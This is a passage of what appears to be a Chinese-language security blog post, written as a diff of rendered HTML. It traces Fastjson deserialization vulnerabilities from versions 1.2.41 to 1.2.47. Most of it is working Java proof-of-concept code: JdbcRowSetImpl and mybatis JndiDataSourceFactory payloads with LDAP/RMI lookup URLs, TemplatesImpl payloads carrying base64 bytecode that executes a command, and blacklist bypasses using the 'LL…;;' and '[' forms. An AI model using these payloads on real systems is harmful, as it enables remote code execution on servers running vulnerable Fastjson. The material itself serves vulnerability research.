+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&#34;,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>那么对于<strong>数组的形式</strong>，JdbcRowSetImpl的POC如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行后成功弹出计算机。</p>
+<p>TemplatesImpl如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;[{,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>然后调试一下过程即可，这里就不多说了。</p>
+<p>局限性还是挺大的，还需要“手动”将autoTypeSupport设置为true。</p>
+<h3 id="1242">1.2.42</h3>
+<p>xml依赖的版本改成1.2.42即可。<strong>这个版本下，数组的payload还是可以打</strong>。</p>
+<p>用前面的JdbcRowSetImpl链来看一下主要的不同点，还是跟进这里的checkAutoType()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413145318201.png" alt="image-20250413145318201"></p>
+<p>这里都是使用哈希来计算的，这里大概意思就是看类名前后是否以<code>L</code>开头，以<code>;</code>结尾，是的话就使用substring()方法来进行截取，然后再进行后续的调用，然后这里的判断是用的hashCode：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413145737171.png" alt="image-20250413145737171"></p>
+<p>没有使用之前的字母的名单，同时这里是肯定会被ban掉的，经过处理后肯定会被匹配到黑名单从而扔出异常，绕过方法就是再加一层，因为这里只匹配一次，也就是只截取一次，而且TypeUtils.loadClass()方法并没有什么变化，双写绕过即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>数组格式没有影响，直接打就行了，只有<code>L</code>格式的使用双写绕过即可</strong>。</p>
+<p>简单说说这里的<code>L</code>过程，前面进行黑名单的判断，也是和前面分析的差不多的，就是与变量autoTypeSupport为true或者false，都会进行一次，但是都不在白名单中，所以无法直接加载，最后还是在如下进行加载的：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413151317839.png" alt="image-20250413151317839"></p>
+<p>可以看到这里是传入的形参传递的内容，然后判断是有clazz是否为null，这里看似可以不用再调用<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</code>来进行设置值，前面我们也知道，这里的autoTypeSupport默认为false，后看有一个逻辑我们必须让这个变量为true：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413152447169.png" alt="image-20250413152447169"></p>
+<p>只有位true才能正常获取到想要的类，不然就会报异常从而退出。</p>
+<p>然后对于<code>TypeUtils.loadClass()</code>方法内的内容：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413152059466.png" alt="image-20250413152059466"></p>
+<p>可以看出来是会调用三次这个loadClass()方法最后才会成功加载到类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413152003020.png" alt="image-20250413152003020"></p>
+<p>后面就是熟知的过程了，这不多说。</p>
+<h3 id="1243">1.2.43</h3>
+<p>依赖改版本，然后直接定位到修改的部分，还是跟进checkAutoType()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413154530007.png" alt="image-20250413154530007"></p>
+<p>里面又套了一个if条件，意思就是如果是以<code>LL</code>开头，那么就直接抛出异常。</p>
+<p>这里的绕过方法就是前面的数组，没错，到这个版本的数组格式还是能打，最后的payload如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>TemplatesImpl就是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;[{,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>——————</p>
+<h3 id="1244">1.2.44</h3>
+<p>同样是在checkAutoType()方法中，如下逻辑：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413183713858.png" alt="image-20250413183713858"></p>
+<p>前一个if是判断是否以<code>[</code>开头，第二个应该是判断最后是否以<code>;</code>结尾吧，从这里可以看出就是修复了<code>[</code>的payload，过滤了数组形式的payload。</p>
+<h3 id="1245">1.2.45</h3>
+<p>这个版本还存在一个黑名单绕过，但是其实是一个组件漏洞，这里利用到的是mybatis组建，需要添加依赖：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.mybatis<span class="nt">&lt;/groupId&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>mybatis<span class="nt">&lt;/artifactId&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.5.7<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>注意修改fastjson的版本。</p>
+<p>其实这个漏洞基本看一下payload就懂了，利用了组件，所以算是利用另外的类，<strong>在1.2.25 &lt;= fastjson &lt;= 1.2.45版本只要有这个组件都能打</strong>。</p>
+<p>POC如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span><span class="p">,</span><span class="s">&#34;properties&#34;</span><span class="p">:{</span><span class="s">&#34;data_source&#34;</span><span class="p">:</span><span class="s">&#34;rmi://127.0.0.1:1099/hello&#34;</span><span class="p">}}</span><span class="w">
+</span></span></span></code></pre></div><p>对应类的setter方法有jndi漏洞：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413184801164.png" alt="image-20250413184801164"></p>
+<p>所以构造了直接打就行了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&#34;,\&#34;properties\&#34;:{\&#34;data_source\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行弹出计算机，注意还是需要设置autoTypeSupport为true。</p>
+<h3 id="1247">1.2.47</h3>
+<p>这个算是比较重要的漏洞点了，可以不开始autoTypeSupport触发反序列化漏洞。</p>
+<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.47</p>
+<p>这里还是从1.2.47版本来分析。</p>
+<p>还是跟进checkAutoType()方法，其实在这个类不止最后那个需要autoTypeSupport为true才能返回加载到的clazz，如下代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413191749197.png" alt="image-20250413191749197"></p>
+<p>这里的expectClass变量默认为null，那么只要我们能在TypeUtils.getClassFromMapping()或者deserializers.findClass()找到想要利用的类，那么就可以直接在这里返回加载到的类。</p>
+<p>跟进这里的TypeUtils.getClassFromMapping()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413204423826.png" alt="image-20250413204423826"></p>
+<p>可以看到是从mapping中取值，那么这个mappings是怎么进行处理的呢，重新跟了一遍流程，没看到有赋值的地方，那么肯定就是TypeUtils类的static语句在进行处理，翻看了一下这个类的static语句，可以看到如下内容：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413211138729.png" alt="image-20250413211138729"></p>
+<p>跟进这个addBaseClassMappings()方法，里面加载了很多类（下图只是部分）：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413211258883.png" alt="image-20250413211258883"></p>
+<p>似乎不可控，那么我们再去看deserializers.findClass()获取类的方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413213142632.png" alt="image-20250413213142632"></p>
+<p>可以看到这里想要返回clazz的话有一定条件，并且这里是与IdentityHashMap类的buckets变量有关，然后看这里的条件，需要key为Class属性。那么我们看一下这里deserializers变量的赋值逻辑，这里肯定就是与ParserConfig类有关了，这个也是之前说的形参传递的类变量，具体如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413214851563.png" alt="image-20250413214851563"></p>
+<p>调用的方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413214914738.png" alt="image-20250413214914738"></p>
+<p>这次就需要跟进ParserConfig类的构造函数了，他的构造函数调用了initDeserializers()方法，这个方法内部可以看到如下内容：</p>
